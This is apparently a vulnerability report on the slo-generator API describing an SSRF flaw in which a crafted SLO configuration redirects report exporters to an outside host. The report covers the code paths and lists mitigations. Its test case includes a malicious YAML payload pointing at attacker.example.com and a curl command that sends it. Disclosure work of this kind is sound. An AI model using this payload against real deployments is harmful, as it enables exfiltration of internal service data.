### Vulnerability List

- Vulnerability Name: SSRF via Malicious Exporter Configuration in API
- Description:
  1. An attacker sends a POST request to the `slo-generator` API with a crafted SLO configuration in the request body.
  2. This malicious SLO configuration is designed to inject or modify the `exporters` section.
  3. The attacker manipulates the exporter configuration, specifically the exporter's destination (e.g., `url` for Prometheus exporter, `service_url` for Cloudevent exporter, `project_id`, `dataset_id`, `table_id` for BigQuery exporter, API keys for Datadog/Dynatrace exporters, etc.) to point to an attacker-controlled external service.
  4. When the `slo-generator` processes this malicious configuration, it will use the attacker-provided exporter configuration to export the SLO report data.
  5. This results in sensitive SLO data being sent to the attacker's external service, effectively achieving Server-Side Request Forgery (SSRF) and data exfiltration.
- Impact:
  - Sensitive SLO data, which may include metrics, error budget information, service names, feature names, and potentially other internal details, is exfiltrated to an attacker-controlled external service.
  - This data breach can expose business-critical information about service performance, reliability, and internal infrastructure, potentially leading to further security risks or competitive disadvantage.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
  - None. The code does not implement any validation or sanitization of the exporter configurations provided in the POST request body to the API.
- Missing Mitigations:
  - Input validation and sanitization of the SLO configuration, especially the `exporters` section, in the API endpoint.
  - Whitelisting of allowed exporter destinations or protocols.
  - Implementing authentication and authorization for the API endpoint to restrict access to authorized users only.
  - Principle of least privilege for the API service account, limiting its access to only necessary resources.
- Preconditions:
  - The `slo-generator` API must be deployed and accessible over a network (e.g., deployed in Cloud Run, Kubernetes, or Cloud Functions).
  - The API endpoint must be configured to accept POST requests with SLO configurations.
  - The attacker must have network access to send POST requests to the `slo-generator` API endpoint.
- Source Code Analysis:
  1. **API Endpoint (`slo_generator/api/main.py`):**
     - The `run_compute` function is the entry point for the API when the target is `compute`.
     - It loads the shared configuration using `load_config(CONFIG_PATH)`.
     - It loads the SLO configuration from the request body using `load_config(data)`.
     - It calls the `compute` function to process the SLO configuration and generate reports.
     - The `run_export` function is the entry point for the API when the target is `run_export`.
     - It loads the shared configuration using `load_config(CONFIG_PATH)`.
     - It extracts the SLO report from the request body using `process_req` and `load_config`.
     - It retrieves exporters configuration using `get_exporters(config, spec)`.
     - It calls the `export` function to export the SLO report data using the retrieved exporters.
     - **Vulnerability Point:** Neither `run_compute` nor `run_export` function validates or sanitizes the SLO configuration loaded from the request body, including the `exporters` section.

  2. **Compute and Export Logic (`slo_generator/compute.py`):**
     - The `compute` function processes the SLO configuration and retrieves exporters using `utils.get_exporters(config, spec)`.
     - The `export` function iterates through the list of exporters and calls the `export` method of each exporter class.
     - **Vulnerability Point:** The `utils.get_exporters` function retrieves exporter configurations based on the `exporters` list in the SLO configuration and the shared configuration, but it doesn't validate the exporter configurations themselves. It blindly trusts the configurations provided in the SLO config.

  3. **Exporter Classes (`slo_generator/exporters/*`):**
     - Exporter classes like `PrometheusExporter`, `CloudeventExporter`, `BigqueryExporter`, `DatadogExporter`, and `DynatraceExporter` use the configuration parameters directly to export data to the specified destinations.
     - For example, `PrometheusExporter` uses the `url` parameter to push metrics to a Prometheus Pushgateway, `CloudeventExporter` uses `service_url` to send CloudEvents, and so on.
     - **Vulnerability Point:** Exporter classes rely on the assumption that the configuration parameters are valid and trustworthy. They do not implement any checks to ensure that the destination URLs or API keys are legitimate or safe.

  4. **Visualization:**

  ```mermaid
  graph LR
      A[Attacker] --> B{slo-generator API Endpoint};
      B -- POST Malicious SLO Config --> C[API Handler (run_compute/run_export)];
      C --> D{load_config (Request Body)};
      D -- Malicious SLO Config --> E[SLO Configuration];
      E --> F{utils.get_exporters};
      F -- Malicious Exporter Config --> G[Exporter Configurations];
      G --> H{export Function};
      H -- Malicious Exporter Configuration --> I[Exporter Class (e.g., PrometheusExporter)];
      I -- Attacker Controlled URL/Service --> J[Attacker Service];
      C --> K[Compute SLO Report];
      K --> H;
      J <-- SLO Report Data -- I;
  ```

- Security Test Case:
  1. **Prerequisites:**
     - Deploy a publicly accessible instance of `slo-generator` API (e.g., in Cloud Run) configured to use the `prometheus` exporter and API mode enabled.
     - Set up a simple HTTP listener (e.g., using `netcat` or `ngrok`) on an attacker-controlled server to capture exfiltrated data. Let's say the attacker server URL is `http://attacker.example.com:8080`.

  2. **Craft Malicious SLO Configuration (YAML):**
     ```yaml
     apiVersion: sre.google.com/v2
     kind: ServiceLevelObjective
     metadata:
       name: malicious-slo-export
       labels:
         service_name: test
         feature_name: test
         slo_name: test
     spec:
       description: Malicious SLO to exfiltrate data
       backend: cloud_monitoring
       method: good_bad_ratio
       exporters:
       - prometheus:
           url: http://attacker.example.com:8080 # Attacker controlled URL
       service_level_indicator:
         filter_good: >
           metric.type="run.googleapis.com/request_count"
           project="your-project-id" # Replace with your project ID if needed
           metric.labels.response_code_class="2xx"
         filter_valid: >
           metric.type="run.googleapis.com/request_count"
           project="your-project-id" # Replace with your project ID if needed
       goal: 0.99
     ```
     Replace `http://attacker.example.com:8080` with the actual URL of your attacker-controlled HTTP listener.

  3. **Send POST Request to API:**
     ```bash
     curl -X POST -H "Content-Type: text/x-yaml" --data-binary @malicious-slo.yaml http://<slo-generator-api-endpoint>
     ```
     Replace `http://<slo-generator-api-endpoint>` with the actual URL of your deployed `slo-generator` API endpoint.

  4. **Observe Exfiltration:**
     - Check the logs of your attacker-controlled HTTP listener. You should see an HTTP POST request containing the SLO report data exfiltrated from the `slo-generator` instance. The data will be in Prometheus exposition format if using the `prometheus` exporter as in the example.

This test case demonstrates that an attacker can successfully redirect SLO report data to an external service by injecting a malicious exporter configuration, confirming the SSRF vulnerability.